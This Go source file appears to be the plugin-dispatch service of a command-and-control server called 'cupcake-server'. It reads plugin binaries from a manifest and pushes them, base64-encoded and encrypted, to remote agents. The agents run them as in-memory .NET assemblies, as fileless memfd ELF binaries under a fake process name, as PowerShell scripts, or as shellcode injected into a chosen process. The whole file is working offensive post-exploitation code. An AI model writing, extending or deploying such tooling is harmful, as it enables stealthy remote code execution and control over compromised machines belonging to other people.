package services

import (
	"cupcake-server/pkg/globals"
	"cupcake-server/pkg/store"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"sync"

	"github.com/google/uuid"
)

var manifestMutex sync.Mutex

// PluginMetadata matches the manifest.json structure
type PluginMetadata struct {
	ID          string `json:"id"`
	Name        string `json:"name"`
	Description string `json:"description"`
	FileName    string `json:"file_name"`
	Type        string `json:"type"`       // "execute-assembly", "native-exec", "powershell", "memfd-exec", etc.
	Category    string `json:"category"`
	RequiredOS  string `json:"required_os"`
	Params      []interface{} `json:"params"`
}

// loadPluginManifestNoLock reads from disk without locking - internal use only
func loadPluginManifestNoLock() ([]PluginMetadata, error) {
	data, err := ioutil.ReadFile("assets/plugins/manifest.json")
	if err != nil {
		return nil, fmt.Errorf("failed to read plugin manifest: %v", err)
	}

	var plugins []PluginMetadata
	if err := json.Unmarshal(data, &plugins); err != nil {
		return nil, fmt.Errorf("failed to parse plugin manifest: %v", err)
	}
	return plugins, nil
}

// LoadPluginManifest reads the metadata from assets/plugins/manifest.json (Locked)
func LoadPluginManifest() ([]PluginMetadata, error) {
	manifestMutex.Lock()
	defer manifestMutex.Unlock()
	return loadPluginManifestNoLock()
}

// DeployPlugin reads the plugin binary and sends it to the agent via CMD_MEMORY_EXEC or specialized commands
func DeployPlugin(agentID string, pluginID string, args string) (string, error) {
	// 1. 获取插件配置
	manifest, err := LoadPluginManifest()
	if err != nil {
		return "", err
	}

	var meta *PluginMetadata
	for _, p := range manifest {
		if p.ID == pluginID {
			meta = &p
			break
		}
	}

	if meta == nil {
		return "", fmt.Errorf("plugin %s not found", pluginID)
	}

	// 2. 读取插件文件
	pluginPath := filepath.Join("assets/plugins", meta.FileName)
	binData, err := os.ReadFile(pluginPath)
	if err != nil {
		return "", fmt.Errorf("failed to read plugin: %v", err)
	}

	// 3. 映射到 Agent 的内部指令
	// 根据 Client/src/handler.rs 的逻辑进行匹配
	cmdType := "shell" // 默认退化为 shell
	content := args    // 默认内容为用户输入的参数

	switch meta.Type {
	case "execute-assembly":
		cmdType = "execute_assembly"
		// 格式: [app_domain|][args|]base64_data (Data 字段会单独带一份)
		content = args 
	case "memfd-exec":
		cmdType = "run_memfd_elf"
		// 格式: [fake_name|]base64_data
		content = args // 用户可以输入伪装进程名
	case "powershell-script":
		cmdType = "powershell_script"
		content = args
	case "shellcode-inject":
		cmdType = "inject_shellcode"
		content = args // 格式通常为 PID
	}

	// 4. 封装并发送
	reqID := uuid.New().String()
	val, ok := globals.Clients.Load(agentID)
	if !ok {
		return "", fmt.Errorf("agent offline")
	}
	client := val.(*globals.Client)

	msg := globals.MessageWrapper{
		MsgType: "command",
		Payload: globals.CommandPayload{
			CommandType:    cmdType,
			CommandContent: content,
			Data:           base64.StdEncoding.EncodeToString(binData),
			ReqID:          reqID,
		},
	}

	log.Printf("[Plugin] Running %s (%s) on %s, Args: %s", meta.Name, cmdType, agentID, args)

	if err := WriteEncryptedMessage(client, msg); err != nil {
		return "", err
	}

	// [LOGGING] Record plugin execution to DB
	_ = store.CreateCommandLog(agentID, reqID, "plugin", fmt.Sprintf("[%s] Args: %s", meta.Name, args))

	return reqID, nil
}

// AddPluginToManifest appends new plugin metadata to manifest.json
func AddPluginToManifest(plugin PluginMetadata) error {
	manifestMutex.Lock()
	defer manifestMutex.Unlock()

	manifest, err := loadPluginManifestNoLock()
	if err != nil {
		manifest = []PluginMetadata{}
	}

	// Double check for duplicate ID
	for _, p := range manifest {
		if p.ID == plugin.ID {
			return fmt.Errorf("plugin with ID %s already exists", plugin.ID)
		}
	}

	manifest = append(manifest, plugin)
	
	data, err := json.MarshalIndent(manifest, "", "  ")
	if err != nil {
		return err
	}

	return ioutil.WriteFile("assets/plugins/manifest.json", data, 0644)
}

// RemovePluginFromManifest removes plugin metadata from manifest.json
func RemovePluginFromManifest(pluginID string) (string, error) {
	manifestMutex.Lock()
	defer manifestMutex.Unlock()

	manifest, err := loadPluginManifestNoLock()
	if err != nil {
		return "", err
	}

	var updated []PluginMetadata
	var fileName string
	found := false

	for _, p := range manifest {
		if p.ID == pluginID {
			fileName = p.FileName
			found = true
			continue
		}
		updated = append(updated, p)
	}

	if !found {
		return "", fmt.Errorf("plugin with ID %s not found", pluginID)
	}

	data, err := json.MarshalIndent(updated, "", "  ")
	if err != nil {
		return "", err
	}

	if err := ioutil.WriteFile("assets/plugins/manifest.json", data, 0644); err != nil {
		return "", err
	}

	return fileName, nil
}
